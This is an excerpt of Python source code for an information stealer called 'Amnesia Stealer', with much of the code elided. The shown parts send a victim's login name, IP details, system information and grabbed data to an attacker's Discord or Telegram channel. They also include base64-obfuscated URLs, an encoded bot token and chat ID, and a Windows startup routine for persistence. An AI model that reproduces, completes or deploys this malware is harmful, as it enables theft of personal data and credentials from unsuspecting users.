...
Logger = logging.getLogger("Amnesia Stealer")
...
class AmnesiaStealer:
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        filename = "Amnesia-%s.%s" % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21vc2hpYXgvZmlsZXMvZjZjOWQwMjljODcxNjYyY2VkNzIyNTY1M2U2MDM1YjI0MzU2NzlhZS9ldGMvM2E3NzZmNTAyODc3ZGM5YjI4YzM4ZjA0YWNjOWFmODYuanBn').decode('utf-8')
                ...
                payload = {
                    'caption': f'<b>Amnesia</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
                ...
                encrypted_token = "NzAwNjI2MjU0NTpBQUdfT3lieGFoNXlKZ0FQRnc5SFRuWmZKdGVwTzV4Qm9iOA=="
                encrypted_chat_id = "LTEwMDIwNzI1MDg2MTk=" 			
...
if __name__ == "__main__" and os.name == "nt":
    ...
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.amnesia")):
        try:
        ...
        while True:
            try:
                ...
                if Utility.IsConnectedToInternet(): # Check if internet connection is available
                    ...
                    AmnesiaStealer() # Start the grabber
